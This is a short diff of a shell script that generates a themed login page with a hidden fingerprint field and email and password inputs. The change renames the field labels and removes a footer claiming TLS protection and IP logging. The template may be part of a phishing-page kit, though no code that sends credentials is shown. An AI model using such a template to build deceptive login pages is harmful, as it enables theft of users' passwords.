@@ -120,13 +120,13 @@ cat > "$TARGET_DIR/index.html" <<EOF
             <input type="hidden" name="fingerprint" id="fp" value="" />
             
             <div class="space-y-1.5">
-                <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED">Identity</label>
+                <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED"> Email</label>
                 <input type="email" id="uid" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="user@domain.com" />
             </div>
             
             <div class="space-y-1.5">
-                <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED">Credential</label>
-                <input type="password" id="sec" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="••••••••" />
+                <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED">Password</label>
+                <input type="password" id="sec" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="" />
             </div>
             
             <button type="submit" id="act-btn" class="w-full py-2.5 text-sm font-semibold text-white shadow-md transition-all active:scale-[0.98] $BUTTON_COLOR $ROUNDING flex justify-center items-center gap-2">
@@ -134,9 +134,7 @@ cat > "$TARGET_DIR/index.html" <<EOF
             </button>
         </form>
         
-        <div class="pt-4 text-center">
-            <p class="text-xs $TEXT_MUTED opacity-60">Protected by TLS 1.3 encryption. IP Logged.</p>
-        </div>
+
     </div>
 
     <script>
